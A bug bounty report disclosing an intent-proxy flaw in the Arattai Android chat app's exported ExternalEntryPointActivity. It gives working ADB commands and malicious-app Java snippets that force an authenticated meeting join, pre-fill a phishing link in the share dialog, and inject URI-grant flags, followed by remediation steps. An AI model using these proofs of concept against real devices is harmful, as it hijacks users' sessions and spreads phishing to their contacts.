# Bug Bounty Report: Intent Proxy in ExternalEntryPointActivity Enables Forced Meeting Join and Content Injection

## Title
Exported ExternalEntryPointActivity Forwards Attacker-Controlled Flags, URIs, and Actions to Internal Components — Forced Authenticated Meeting Join and Share Dialog Manipulation

## Severity
**MEDIUM** (CVSS 3.1: 5.5 — AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)

## Affected Component
- Arattai Android App v1.54.0 (com.aratai.chat)
- `com.arattai.home.presentation.ui.ExternalEntryPointActivity` (exported, no permission)

## Summary
`ExternalEntryPointActivity` is an exported activity that handles `VIEW`, `SEND`, `SENDTO`, and `SEND_MULTIPLE` intents. For `VIEW` intents, it creates a new intent to the internal `HomeActivity` and copies attacker-controlled fields — including data URI, type, action, **intent flags** (ORed into the forwarded intent), and **selector**. A co-installed malicious app can exploit this to:

1. **Force the user into an attacker-controlled meeting** with their authenticated session (server-side request confirmed)
2. **Pre-load attacker text in the share dialog** targeting the user's contacts

## Root Cause
```java
// ExternalEntryPointActivity.java:638-662
intent8.setDataAndType(getIntent().getData(), getIntent().getType());
intent8.setAction(getIntent().getAction());
intent8.setFlags(65536);
if (!z4) {
    intent8.setFlags(intent8.getFlags() | getIntent().getFlags());  // attacker flags ORed in
}
intent8.setSelector(getIntent().getSelector());
```

The activity copies attacker-controlled `data`, `type`, `action`, `flags`, and `selector` into a new intent forwarded to `HomeActivity`, which processes it through the internal deep link router.

## Steps to Reproduce

### Proof 1: Forced Meeting Join (Server-Side Request Confirmed)

**Via ADB (test equivalent):**
```bash
adb shell am start -n com.aratai.chat/com.arattai.home.presentation.ui.ExternalEntryPointActivity \
  -a android.intent.action.VIEW \
  -d 'https://meet.arattai.in/join/ATTACKER-MEETING-ID'
```

**Via malicious app (real attack vector):**
```java
// MaliciousActivity.java
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("https://meet.arattai.in/join/ATTACKER-CONTROLLED-MEETING"));
intent.setComponent(new ComponentName(
    "com.aratai.chat",
    "com.arattai.home.presentation.ui.ExternalEntryPointActivity"
));
startActivity(intent);
```

**Result:** App immediately attempts to join the meeting with the user's authenticated session. Toast displayed: "Error while joining" (proving the server-side request was made). With a valid meeting ID controlled by the attacker, this would successfully force-join the user.

**Evidence:** Screenshot `test_meeting.png`

### Proof 2: Share Dialog Content Injection

**Via ADB:**
```bash
adb shell am start -n com.aratai.chat/com.arattai.home.presentation.ui.ExternalEntryPointActivity \
  -a android.intent.action.SEND -t 'text/plain' \
  --es android.intent.extra.TEXT 'Click here for a free gift: https://evil.attacker.com'
```

**Via malicious app:**
```java
Intent intent = new Intent(Intent.ACTION_SEND);
intent.setType("text/plain");
intent.putExtra(Intent.EXTRA_TEXT, "Click here for a free gift: https://evil.attacker.com");
intent.setComponent(new ComponentName(
    "com.aratai.chat",
    "com.arattai.home.presentation.ui.ExternalEntryPointActivity"
));
startActivity(intent);
```

**Result:** Share dialog opens with attacker text pre-loaded, showing the user's contact list including "My stories" and "Pocket". If the user taps a contact, the phishing message is sent.

**Evidence:** Screenshot `test_send.png`

### Proof 3: Intent Flag Injection

```bash
adb shell am start -n com.aratai.chat/com.arattai.home.presentation.ui.ExternalEntryPointActivity \
  -a android.intent.action.VIEW \
  -d 'content://com.aratai.chat.provider/files/.' -f 0x3
```

**Result:** FLAGS_GRANT_READ_URI_PERMISSION (0x1) and FLAG_GRANT_WRITE_URI_PERMISSION (0x2) are ORed into the forwarded intent. The handler rejected this specific URI, but the flags were successfully injected.

**Evidence:** Screenshot `test_flag_inject.png`

## Impact

### Confirmed Impacts
1. **Forced meeting join**: Attacker creates a meeting, force-joins the victim → victim's authenticated session used, presence leaked, potential camera/mic activation
2. **Social engineering**: Pre-load phishing messages in share dialog targeting the victim's contacts
3. **Flag injection**: Attacker-controlled flags forwarded to internal components

### Attack Scenario
1. Victim installs any app from the Play Store (the malicious app)
2. Malicious app sends a VIEW intent with `https://meet.arattai.in/join/<attacker-meeting-id>`
3. Arattai opens and immediately joins the attacker's meeting using the victim's authenticated session
4. Attacker sees the victim join, potentially with camera/mic active

## Remediation
1. Remove the `intent8.setFlags(intent8.getFlags() | getIntent().getFlags())` line — never OR attacker-controlled flags
2. Replace `intent8.setSelector(getIntent().getSelector())` with `intent8.setSelector(null)` — never forward selectors
3. Allowlist expected deep link URI patterns before forwarding (e.g., only `https://arattai.in/`, `https://meet.arattai.in/`, `arattai://`)
4. Add a user confirmation dialog before joining meetings via deep links
5. Consider removing the export flag from `ExternalEntryPointActivity` or adding caller signature verification

## Environment
- App: Arattai v1.54.0 (com.aratai.chat)
- Android: API 35 (emulator, x86_64, rooted)
- Date: 2026-10-05
